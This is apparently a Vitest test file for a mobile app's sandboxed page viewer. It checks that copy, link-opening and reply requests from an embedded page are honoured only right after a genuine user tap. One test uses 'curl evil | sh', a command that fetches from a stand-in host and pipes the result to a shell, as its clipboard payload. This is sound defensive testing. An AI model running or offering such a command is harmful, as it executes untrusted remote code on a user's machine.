// @vitest-environment jsdom
import type { ReactNode } from "react";
import { act, createElement, Suspense, startTransition } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, expect, it, vi } from "vitest";
import type * as Pages from "./pages";

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

const host = vi.hoisted(() => ({
  touch: {} as Record<string, ((event: object) => void) | undefined>,
  message: undefined as ((data: string, answer: (message: object) => void) => void) | undefined,
  loadStart: undefined as (() => void) | undefined,
  documentOptions: {} as { reply?: boolean; lang?: string },
  copied: [] as string[],
  opened: [] as string[],
  routes: [] as { name: string; params?: object }[],
  went: [] as unknown[],
  html: "",
  runtimeFails: false,
  theme: "light",
  spaceGeneration: 1,
  readError: null as unknown,
  page: {
    id: "page-1",
    title: "Plan",
    code: "",
    botId: "bot-1" as string | null,
    groupId: null as string | null,
  },
}));

vi.mock("react-native", () => ({
  ActivityIndicator: () => null,
  Platform: { OS: "android" },
  Text: ({ children }: { children?: ReactNode }) => createElement("p", {}, children),
  View: ({ children, ...props }: { children?: ReactNode } & Record<string, unknown>) => {
    if (props.onTouchStart) host.touch = props as typeof host.touch;
    return createElement("div", {}, children);
  },
  StyleSheet: { create: (styles: unknown) => styles, hairlineWidth: 1 },
}));
vi.mock("expo-clipboard", () => ({
  setStringAsync: async (text: string) => {
    host.copied.push(text);
    return true;
  },
}));
vi.mock("expo-router", () => ({
  useLocalSearchParams: () => ({ pageId: host.page.id }),
  useRouter: () => ({
    back: () => host.went.push("back"),
    canGoBack: () => true,
    push: (href: unknown) => host.went.push(href),
    replace: (href: unknown) => host.went.push(href),
  }),
  useNavigation: () => ({
    getState: () => ({ routes: [...host.routes, { name: "page" }], index: host.routes.length }),
  }),
}));
vi.mock("react-native-safe-area-context", () => ({ useSafeAreaInsets: () => ({ top: 0 }) }));
vi.mock("@rakazo/chat-ui/native", () => ({
  useNativeLinkConfirm: () => (url: string) => host.opened.push(url),
}));
vi.mock("../components/native-symbol", () => ({ NativeSymbol: () => null }));
vi.mock("../components/native-action-button", () => ({
  NativeActionButton: (props: {
    label?: string;
    accessibilityLabel?: string;
    icon?: { ios: string; android: string };
    onPress: () => void;
  }) =>
    createElement(
      "button",
      {
        type: "button",
        "aria-label": props.accessibilityLabel ?? props.label,
        "data-icon": props.icon ? `${props.icon.ios} ${props.icon.android}` : undefined,
        onClick: props.onPress,
      },
      props.label,
    ),
}));
vi.mock("../components/sandboxed-html-preview", () => ({
  SandboxedHtmlPreview: ({
    html,
    onMessage,
    onLoadStart,
  }: {
    html: string;
    onMessage: typeof host.message;
    onLoadStart?: () => void;
  }) => {
    host.html = html;
    host.message = onMessage;
    host.loadStart = onLoadStart;
    return null;
  },
}));
vi.mock("./api", () => ({
  currentApiBase: () => "https://app.example",
  currentApiBaseGeneration: () => 1,
  currentSpaceSelectionGeneration: () => host.spaceGeneration,
  selectedSpaceId: () => "space-1",
  subscribeApiBase: () => () => {},
  subscribeSelectedSpace: () => () => {},
  captureApiRequestContext: async () => ({ apiBase: "https://app.example", headers: {} }),
  rpc: vi.fn(),
}));
vi.mock("./session", () => ({
  registerSessionDiskCache: () => undefined,
  currentSessionGeneration: () => 1,
  subscribeSessionGeneration: () => () => {},
}));
vi.mock("./page-runtime", () => ({ loadPageRuntime: async () => "" }));
vi.mock("./native", () => ({
  useMobileTokens: () => ({}),
  useResolvedAppearance: () => host.theme,
}));
vi.mock("./pages", async (original) => ({
  ...(await original<typeof Pages>()),
  getLatestPage: async () => {
    if (host.readError) throw host.readError;
    return host.page;
  },
  pageDocument: async (...args: unknown[]) => {
    if (host.runtimeFails) throw new Error("Page runtime returned 503");
    host.documentOptions = args[4] as typeof host.documentOptions;
    return `<p>page</p>${JSON.stringify(args[4] ?? {})}`;
  },
}));

const { default: PageScreen } = await import("../app/page");
const { takePageReply } = await import("./pages");
const { activateUiLocale } = await import("./i18n");

/** A finger at `x`,`y` on the screen, as React Native reports a touch. */
const at = (x: number, y: number, fingers = 1) => ({
  nativeEvent: { pageX: x, pageY: y, touches: Array.from({ length: fingers }) },
});

it("copies and opens links for a page only right after the person tapped it", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  const now = vi.spyOn(Date, "now").mockReturnValue(1_000_000);
  const root = createRoot(document.createElement("div"));
  await act(async () => root.render(createElement(PageScreen)));
  const send = (data: object) =>
    act(async () => {
      host.message?.(JSON.stringify(data), () => undefined);
      await new Promise((resolve) => setTimeout(resolve, 0));
    });
  const touch = (name: string, x: number, y: number, fingers?: number) =>
    host.touch[name]?.(at(x, y, fingers));
  const copy = { type: "rakazo-page:copy", id: "a", text: "curl evil | sh" };
  const link = { type: "rakazo-page:open-link", url: "https://example.com/x" };
  const attempt = async () => {
    await send(copy);
    await send(link);
  };

  // On load, with a finger still down and no tap yet, a page asks for nothing it gets.
  touch("onTouchStart", 100, 100);
  await attempt();
  // A scroll is not a tap, even one that comes back to where it started.
  touch("onTouchMove", 100, 160);
  touch("onTouchEnd", 100, 101);
  await attempt();
  // Or a flick too quick to report a move.
  touch("onTouchStart", 100, 100);
  touch("onTouchEnd", 100, 200);
  await attempt();
  // Nor is a pinch.
  touch("onTouchStart", 100, 100, 2);
  touch("onTouchEnd", 100, 100);
  await attempt();
  // A touch the system took over (a back swipe) is not one either.
  touch("onTouchStart", 100, 100);
  host.touch.onTouchCancel?.({});
  touch("onTouchEnd", 100, 100);
  await attempt();
  expect([host.copied, host.opened]).toEqual([[], []]);

  touch("onTouchStart", 100, 100);
  touch("onTouchMove", 104, 103);
  touch("onTouchEnd", 104, 103);
  now.mockReturnValue(1_000_800);
  // One tap is one action: the link the page asks for with that same tap waits for another.
  await attempt();
  expect([host.copied, host.opened]).toEqual([["curl evil | sh"], []]);
  touch("onTouchStart", 100, 100);
  touch("onTouchEnd", 100, 100);
  await send(link);
  await send(copy);
  expect(host.copied).toHaveLength(1);
  // Links go through the same prompt as a link in chat.
  expect(host.opened).toEqual(["https://example.com/x"]);

  // A second after the tap the page is on its own again.
  touch("onTouchStart", 100, 100);
  touch("onTouchEnd", 100, 100);
  now.mockReturnValue(1_001_801);
  await attempt();
  expect(host.copied).toHaveLength(1);
  expect(host.opened).toHaveLength(1);
  await act(async () => root.unmount());
});

it("does not carry a tap into a document rebuilt for a theme change", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  vi.spyOn(Date, "now").mockReturnValue(3_000_000);
  host.copied = [];
  const root = createRoot(document.createElement("div"));
  await act(async () => root.render(createElement(PageScreen)));
  const copy = () =>
    act(async () => {
      host.message?.(JSON.stringify({ type: "rakazo-page:copy", id: "a", text: "x" }), () => {});
      await new Promise((resolve) => setTimeout(resolve, 0));
    });
  host.touch.onTouchStart?.(at(10, 10));
  host.touch.onTouchEnd?.(at(10, 10));
  // The system switches to dark mode, so the page loads again within the same second.
  host.theme = "dark";
  await act(async () => root.render(createElement(PageScreen)));
  await copy();
  expect(host.copied).toEqual([]);
  host.touch.onTouchStart?.(at(10, 10));
  host.touch.onTouchEnd?.(at(10, 10));
  await copy();
  expect(host.copied).toEqual(["x"]);
  host.theme = "light";
  await act(async () => root.unmount());
});

it("does not let an older document callback borrow a new document's tap, including A to B to A", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  vi.spyOn(Date, "now").mockReturnValue(3_100_000);
  const originalPage = host.page;
  const root = createRoot(document.createElement("div"));
  host.copied = [];
  host.opened = [];
  host.went = [];
  takePageReply("bot-1");
  try {
    await act(async () => root.render(createElement(PageScreen)));
    const oldMessage = host.message!;
    for (const pageId of ["page-2", originalPage.id]) {
      host.page = { ...originalPage, id: pageId };
      await act(async () => root.render(createElement(PageScreen)));
      for (const message of [
        { type: "rakazo-page:copy", id: "old", text: "old document" },
        { type: "rakazo-page:open-link", url: "https://example.com/old" },
        { type: "rakazo-page:reply", text: "Old reply" },
      ]) {
        host.touch.onTouchStart?.(at(10, 10));
        host.touch.onTouchEnd?.(at(10, 10));
        // A callback saved by a previous native view has no authority over this tap.
        await act(async () => oldMessage(JSON.stringify(message), () => {}));
        expect([host.copied, host.opened, host.went, takePageReply("bot-1")]).toEqual([
          [],
          [],
          [],
          null,
        ]);
        // Rejecting the old callback does not spend the new document's one action.
        await act(async () =>
          host.message?.(
            JSON.stringify({ type: "rakazo-page:copy", id: "new", text: pageId }),
            () => {},
          ),
        );
        expect(host.copied).toEqual([pageId]);
        host.copied = [];
      }
    }
  } finally {
    await act(async () => root.unmount());
    host.page = originalPage;
  }
});

it("keeps the committed document's callback valid when a different document render is suspended", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  vi.spyOn(Date, "now").mockReturnValue(3_200_000);
  const originalPage = host.page;
  const pending = new Promise<never>(() => {});
  let suspend = false;
  let reachedPendingRender = false;
  function PendingDocument() {
    if (suspend) {
      reachedPendingRender = true;
      throw pending;
    }
    return null;
  }
  const tree = () =>
    createElement(Suspense, { fallback: "Loading" }, [
      createElement(PageScreen, { key: "page" }),
      createElement(PendingDocument, { key: "pending" }),
    ]);
  const container = document.createElement("div");
  const root = createRoot(container);
  host.copied = [];
  try {
    await act(async () => root.render(tree()));
    const committedMessage = host.message!;
    host.page = { ...originalPage, id: "page-uncommitted" };
    suspend = true;
    await act(async () => startTransition(() => root.render(tree())));
    expect(reachedPendingRender).toBe(true);
    expect(container.textContent).not.toContain("Loading");
    host.touch.onTouchStart?.(at(10, 10));
    host.touch.onTouchEnd?.(at(10, 10));
    await act(async () =>
      committedMessage(
        JSON.stringify({ type: "rakazo-page:copy", id: "committed", text: "still current" }),
        () => {},
      ),
    );
    expect(host.copied).toEqual(["still current"]);
  } finally {
    host.page = originalPage;
    suspend = false;
    await act(async () => root.unmount());
  }
});

it("puts a tapped reply in the page's own chat unsent, closing the page or opening that chat", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  const now = vi.spyOn(Date, "now").mockReturnValue(2_000_000);
  const show = async () => {
    const root = createRoot(document.createElement("div"));
    await act(async () => root.render(createElement(PageScreen)));
    return root;
  };
  const tapThenReply = async (text: string, delay = 500) => {
    host.touch.onTouchStart?.(at(50, 50));
    host.touch.onTouchEnd?.(at(50, 50));
    now.mockReturnValue(2_000_000 + delay);
    await act(async () =>
      host.message?.(JSON.stringify({ type: "rakazo-page:reply", text }), () => {}),
    );
    now.mockReturnValue(2_000_000);
  };
  host.went = [];

  // Opened from its chat: the reply goes back there.
  host.routes = [{ name: "thread", params: { botId: "bot-1" } }];
  let root = await show();
  expect(host.documentOptions.reply).toBe(true);
  await act(async () =>
    host.message?.(JSON.stringify({ type: "rakazo-page:reply", text: "B" }), () => {}),
  );
  await tapThenReply("Pick  option\n B", 1_200);
  expect([host.went, takePageReply("bot-1")]).toEqual([[], null]);
  await tapThenReply("Pick  option\n B");
  expect(host.went).toEqual(["back"]);
  expect(takePageReply("bot-2")).toBeNull();
  expect(takePageReply("bot-1")).toEqual({
    text: "Pick option B",
    page: { id: "page-1", title: "Plan" },
  });
  expect(takePageReply("bot-1")).toBeNull();
  await act(async () => root.unmount());

  // Opened from somewhere else, such as another chat: the page's group chat opens in its place.
  host.went = [];
  host.routes = [{ name: "thread", params: { botId: "bot-9" } }];
  host.page = { ...host.page, groupId: "group-1" };
  root = await show();
  await tapThenReply("Watch it");
  expect(host.went).toEqual([{ pathname: "/group-thread", params: { groupId: "group-1" } }]);
  expect(takePageReply("group-1")).toEqual({
    text: "Watch it",
    page: { id: "page-1", title: "Plan" },
  });
  await act(async () => root.unmount());

  // A page whose chat is gone offers no replies at all.
  host.went = [];
  host.page = { ...host.page, botId: null, groupId: null };
  root = await show();
  expect(host.documentOptions.reply).toBe(false);
  await tapThenReply("Orphan");
  expect(host.went).toEqual([]);
  host.page = { ...host.page, botId: "bot-1" };
  await act(async () => root.unmount());
});

it("says a page that could not load in the user's words, with Try again unless it is gone", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  const render = async () => {
    const container = document.createElement("div");
    const root = createRoot(container);
    await act(async () => root.render(createElement(PageScreen)));
    return { container, root };
  };
  // The page reads, but its runtime fails to download.
  host.html = "";
  host.runtimeFails = true;
  const failed = await render();
  expect(failed.container.textContent).toBe("Could not load this page.Try again");
  host.runtimeFails = false;
  await act(async () => failed.container.querySelector("button")!.click());
  expect(host.html).toContain("<p>page</p>");
  expect(failed.container.textContent).toBe("");
  await act(async () => failed.root.unmount());

  // A deleted page says so, and trying again cannot bring it back.
  host.readError = Object.assign(new Error("Resource not found"), { code: "NOT_FOUND" });
  const gone = await render();
  expect(gone.container.textContent).toBe("This page isn't available");
  expect(
    [...gone.container.querySelectorAll("button")].map((button) => button.textContent),
  ).toEqual([""]);
  host.readError = null;
  await act(async () => gone.root.unmount());
});

it("closes the page with the native icon button", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  host.went = [];
  const container = document.createElement("div");
  const root = createRoot(container);
  await act(async () => root.render(createElement(PageScreen)));
  const buttons = [...container.querySelectorAll("button")];
  expect(
    buttons.map((button) => [
      button.getAttribute("aria-label"),
      button.dataset.icon,
      button.textContent,
    ]),
  ).toEqual([["Close", "xmark close", ""]]);
  await act(async () => buttons[0]!.click());
  expect(host.went).toEqual(["back"]);
  await act(async () => root.unmount());
});

it("does not carry a native tap across a Space generation change", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  host.copied = [];
  const root = createRoot(document.createElement("div"));
  await act(async () => root.render(createElement(PageScreen)));
  host.touch.onTouchStart?.(at(10, 10));
  host.touch.onTouchEnd?.(at(10, 10));
  host.spaceGeneration += 1;
  await act(async () => root.render(createElement(PageScreen)));
  await act(async () =>
    host.message?.(
      JSON.stringify({ type: "rakazo-page:copy", id: "stale", text: "wrong scope" }),
      () => {},
    ),
  );
  expect(host.copied).toEqual([]);
  host.touch.onTouchStart?.(at(10, 10));
  host.touch.onTouchEnd?.(at(10, 10));
  await act(async () =>
    host.message?.(
      JSON.stringify({ type: "rakazo-page:copy", id: "fresh", text: "current scope" }),
      () => {},
    ),
  );
  expect(host.copied).toEqual(["current scope"]);
  await act(async () => root.unmount());
  vi.unstubAllGlobals();
});

it("revokes both a completed tap and a held finger on a native WebView loadstart", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  vi.spyOn(Date, "now").mockReturnValue(4_000_000);
  host.copied = [];
  const root = createRoot(document.createElement("div"));
  await act(async () => root.render(createElement(PageScreen)));
  const copy = () =>
    act(async () =>
      host.message?.(
        JSON.stringify({ type: "rakazo-page:copy", id: "reload", text: "fresh document" }),
        () => {},
      ),
    );
  const tap = () => {
    host.touch.onTouchStart?.(at(10, 10));
    host.touch.onTouchEnd?.(at(10, 10));
  };
  tap();
  // This is the native WebView event, without a React prop or theme change.
  host.loadStart?.();
  await copy();
  expect(host.copied).toEqual([]);
  host.touch.onTouchStart?.(at(10, 10));
  host.loadStart?.();
  host.touch.onTouchEnd?.(at(10, 10));
  await copy();
  expect(host.copied).toEqual([]);
  // A long press still held down, then cancelled by the OS, is not a new tap.
  host.touch.onTouchStart?.(at(10, 10));
  await copy();
  host.touch.onTouchCancel?.({});
  host.touch.onTouchEnd?.(at(10, 10));
  await copy();
  expect(host.copied).toEqual([]);
  tap();
  await copy();
  expect(host.copied).toEqual(["fresh document"]);
  await act(async () => root.unmount());
});

it("rebuilds PageKit for the actual locale and revokes the previous locale's tap", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  activateUiLocale("en");
  host.copied = [];
  const root = createRoot(document.createElement("div"));
  await act(async () => root.render(createElement(PageScreen)));
  expect(host.documentOptions.lang).toBe("en");
  host.touch.onTouchStart?.(at(10, 10));
  host.touch.onTouchEnd?.(at(10, 10));
  // `t` deliberately stays the same function, as it does in the native i18n hook.
  await act(async () => {
    activateUiLocale("zh-CN");
  });
  expect(host.documentOptions.lang).toBe("zh-CN");
  const copy = () =>
    act(async () =>
      host.message?.(
        JSON.stringify({ type: "rakazo-page:copy", id: "locale", text: "current language" }),
        () => {},
      ),
    );
  await copy();
  expect(host.copied).toEqual([]);
  host.touch.onTouchStart?.(at(10, 10));
  host.touch.onTouchEnd?.(at(10, 10));
  await copy();
  expect(host.copied).toEqual(["current language"]);
  await act(async () => root.unmount());
  activateUiLocale("en");
});
